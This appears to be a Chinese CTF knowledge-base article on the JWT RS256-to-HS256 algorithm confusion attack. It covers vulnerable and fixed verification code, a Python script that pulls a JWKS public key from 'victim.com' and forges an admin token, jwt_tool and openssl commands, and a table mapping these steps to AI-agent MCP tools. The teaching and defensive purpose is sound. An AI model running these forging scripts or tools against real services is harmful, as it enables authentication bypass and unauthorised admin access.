---
id: "ctf-website/02-auth/jwt/02-algorithm-confusion"
title: "JWT 算法混淆 (Algorithm Confusion)"
title_en: "JWT Algorithm Confusion Attack"
summary: >
  利用服务端信任客户端指定的算法且将非对称密钥用于对称验证的缺陷，实现 JWT 签名绕过。核心原理是将 RS256 公钥当作 HS256 的 HMAC 密钥使用，用公钥重新签名即可通过验证。涵盖从 JWKS 获取公钥到伪造 Token 的完整攻击脚本。
summary_en: >
  Exploiting the flaw where servers trust client-specified algorithms and reuse asymmetric keys for symmetric verification. The core technique uses the RS256 public key as an HMAC secret for HS256, re-signing with the known public key to bypass verification. Includes complete attack scripts from JWKS retrieval to token forging.
board: "ctf-website"
category: "02-auth"
signals: ["算法混淆", "algorithm confusion", "RS256", "HS256", "公钥", "JWKS", "HMAC", "jwt_tool"]
mcp_tools: ["run_ctf_tool", "http_probe"]
keywords: ["JWT算法混淆", "RS256转HS256", "JWT bypass", "公钥泄露", "jwks.json", "algorithm confusion", "jwt_tool"]
difficulty: "intermediate"
tags: ["authentication", "jwt", "algorithm-confusion", "web-security", "crypto", "ctf"]
language: "zh-CN"
last_updated: "2026-07-04"
related_articles: []
---

# JWT 算法混淆 (Algorithm Confusion)

## 输入信号

- 原 token 使用 `RS256/RS384/RS512/ES256`，同时公开 JWKS、公钥、证书或 OpenID 配置
- 修改 `alg` 后错误从 `invalid signature` 变成 `invalid key`、`algorithm not allowed` 或不同耗时
- 服务端同时支持 HS 和 RS/ES 系列算法，且未固定 token 类型
- TLS 证书、公钥文件、`/.well-known/jwks.json`、移动端包或前端配置能拿到验证公钥

## 0. 公钥来源矩阵

| 来源 | 获取方式 | 价值 | 失败样本 |
|------|----------|------|----------|
| JWKS | `/.well-known/jwks.json` | 直接转 PEM 做 HMAC key | `kid` 不匹配或只支持 RS |
| OpenID config | `jwks_uri` | 找真实 JWKS 地址 | 地址需内网访问 |
| TLS 证书 | `openssl s_client` | 公钥可能复用 | 与 JWT key 不同 |
| 源码/移动端 | `public.pem`, `cert.pem` | 常见硬编码 | 只有测试环境 key |
| 错误页 | stack trace / config dump | 泄露 key path | 只泄露路径不泄露内容 |

## 0.1 判定矩阵

| 变体 | 动作 | 命中样本 | 下一步 |
|------|------|----------|--------|
| RS -> HS | 用 PEM 原文作 HMAC secret | 管理接口 200 | 固化伪造器 |
| JWK -> HS | 用 JWK 转 PEM/DER 多格式尝试 | 其中一种格式通过 | 记录 key format |
| ES -> HS | 用 EC public key bytes 作 HMAC secret | 错误变业务响应 | 跟进库实现 |
| alg 大小写 | `hs256`, `HS256` | parser 归一化差异 | 组合 none/kid |
| kid 指向公开 key | 换 `kid` + HS256 | key 选择可控 | 转 kid injection |

## 原理

核心矛盾在于：**验证逻辑允许客户端在 Header 中指定算法，而服务端密钥的"角色"随算法不同而改变**。

```
┌─────────────────────────────────────────────────────────────┐
│ RS256 (非对称) — 正常状态                                     │
│                                                              │
│   签发:  私钥签名             验证:  公钥验证                  │
│   ┌────┐                    ┌────┐                          │
│   │SK  │── sign ──▶ Token   │PK  │── verify ──▶ ✓           │
│   └────┘                    └────┘                          │
│                                                              │
│   PK 是公开的，任何人都能拿到（/.well-known/jwks.json）       │
├─────────────────────────────────────────────────────────────┤
│ HS256 (对称) — 攻击者利用的状态                                │
│                                                              │
│   签发:  密钥签名             验证:  同一密钥验证               │
│   ┌────┐                    ┌────┐                          │
│   │ K  │── sign ──▶ Token   │ K  │── verify ──▶ ✓           │
│   └────┘                    └────┘                          │
│                                                              │
│   攻击者把 PK 当作 K（HMAC 密钥），用 PK 重新签名伪造 Token     │
│   服务端也用 PK 做 HMAC 验证 → 通过！                          │
└─────────────────────────────────────────────────────────────┘
```

**一句话**：服务端用 RS256 公钥去验证 HMAC — 公钥就是一堆已知字节，HMAC 只认字节不认来源，攻击者用同一段字节做 HMAC 签名自然能过。

## 伪代码：漏洞逻辑

```python
# 漏洞代码 — 信任 Header 中的 alg
def verify_token(token, public_key_pem):
    header_b64, payload_b64, sig_b64 = token.split('.')
    header = json.loads(base64url_decode(header_b64))

    # BUG: 算法由客户端指定，而非服务端固定
    if header['alg'] == 'RS256':
        return rsa_verify(header_b64 + '.' + payload_b64, sig, public_key_pem)

    elif header['alg'] == 'HS256':
        # BUG: 把 RSA 公钥 (PEM 字节串) 当作 HMAC 密钥
        return hmac_verify(header_b64 + '.' + payload_b64, sig, public_key_pem)

    elif header['alg'] == 'ES256':
        return ecdsa_verify(...)

# 攻击者只需要:
#   1. 获取公钥 public_key_pem  (公开信息)
#   2. 将 alg 改为 HS256
#   3. 用 public_key_pem 作为 HMAC 密钥签名
#   4. 服务端走 HS256 分支，用同一个 public_key_pem 验证 → 通过
```

```python
# 正确代码 — 服务端固定算法
ALLOWED_ALG = 'RS256'  # 固定

def verify_token(token, public_key_pem):
    header = jwt_decode_header(token)
    if header['alg'] != ALLOWED_ALG:
        raise InvalidAlgorithmError()
    return rsa_verify(token, public_key_pem)
```

## 伪代码：攻击脚本

```python
# attack_algorithm_confusion.py
import base64, json, hmac, hashlib
import requests

def get_public_key(target: str) -> bytes:
    """
    从常见位置获取 RSA 公钥
    """
    endpoints = [
        "/.well-known/jwks.json",
        "/jwks.json",
        "/api/jwks",
        "/openid/connect/jwks",
        "/.well-known/openid-configuration",  # → jwks_uri
    ]
    for ep in endpoints:
        resp = requests.get(target + ep)
        if resp.status_code == 200:
            if "keys" in resp.json():
                # 提取第一个 key，转为 PEM
                jwk = resp.json()["keys"][0]
                return jwk_to_pem(jwk)
    return None

def jwk_to_pem(jwk: dict) -> bytes:
    """JWK → PEM 公钥"""
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
    from cryptography.hazmat.backends import default_backend
    import struct

    n = int.from_bytes(base64.urlsafe_b64decode(jwk['n'] + '=='), 'big')
    e = int.from_bytes(base64.urlsafe_b64decode(jwk['e'] + '=='), 'big')

    pub = rsa.RSAPublicNumbers(e, n).public_key(default_backend())
    return pub.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )

def forge_token_hmac(payload: dict, key: bytes, algorithm='HS256') -> str:
    """
    用已知公钥当作 HMAC 密钥，伪造 token
    """
    hash_func = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384,
                 'HS512': hashlib.sha512}[algorithm]

    header_b64 = b64url(json.dumps({"alg": algorithm, "typ": "JWT"}))
    payload_b64 = b64url(json.dumps(payload))
    msg = f"{header_b64}.{payload_b64}".encode()

    sig = hmac.new(key, msg, hash_func).digest()
    sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()

    return f"{header_b64}.{payload_b64}.{sig_b64}"

# --- 攻击入口 ---
target = "https://victim.com"
pub_key = get_public_key(target)
if pub_key:
    admin_token = forge_token_hmac(
        payload={"sub": "admin", "role": "admin", "exp": 9999999999},
        key=pub_key,
        algorithm='HS256'
    )
    resp = requests.get(target + "/api/admin",
        headers={"Authorization": f"Bearer {admin_token}"})
    print(f"[+] Status: {resp.status_code}")
```

## 进阶：PK 不可直接获取时

### 从两个 token 恢复公钥

如果有两个**不同**的 RS256 JWT，可以恢复公钥（类似 RSA 共模攻击）：

```python
# 条件: 两个 token 用同一个私钥签发
# JWT1: Header1.Payload1.Sig1
# JWT2: Header2.Payload2.Sig2
# Sig = PKCS1v15(H(Header.Payload)) mod N
# 若 H1 和 H2 已知，则可通过 GCD 推导 N，进而恢复公钥
```

### 从 TLS 证书获取

```bash
# 服务端 TLS 证书的公钥可能与 JWT 签名密钥相同
openssl s_client -connect victim.com:443 2>/dev/null | openssl x509 -pubkey -noout
```

## 检测信号

- Header 中 `alg` 为 `RS256` 或 `ES256`
- 访问 `/.well-known/jwks.json` 返回 JWK Set
- 修改 `alg` 为 `HS256` 后签名为空 → 返回 "Signature verification failed"
- 响应错误信息提示算法不匹配

## 工具命令

```bash
# jwt_tool 算法混淆检测
python3 jwt_tool.py <token> -X k -pk public.pem

# PortSwigger 的 jwt-forgery.py
python3 jwt-forgery.py <token> <public_key_or_jwks_url>

# jwk_to_pem 转换
python3 -c "
from jwt.algorithms import RSAAlgorithm
key = RSAAlgorithm.from_jwk(open('jwk.json').read())
print(key.export_key().decode())
"
```

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| JWT 算法混淆攻击 | `run_ctf_tool jwt_tool` | 使用 jwt_tool 进行 RS→HS 算法混淆 |
| 公钥探测 | `http_probe` | HTTP GET 探测公钥文件位置 |

## 工作流

捕获原始 Token → 解码 header/claims → 一次验证一个签名或校验假设 → 构造最小变体 → 访问同一权限 oracle → 对比身份/权限/Flag。


## Evidence

- `public_key_sources.json`: JWKS、PEM、DER、证书、来源 URL、kid、hash。
- `alg_confusion_attempts.csv`: key format、alg、kid、payload diff、状态码、body hash。
- 成功样本: 使用公开公钥作 HMAC secret 后，伪造 `role=admin` token 被目标接口接受。
- 失败样本: 只接受固定 RS/ES 算法、HS 分支不启用、公钥格式全部返回同一签名错误。
- 下一跳: 公钥不可得转 `05-jku-x5u-abuse`；发现 `kid` 参与选 key 转 `04-kid-injection`。
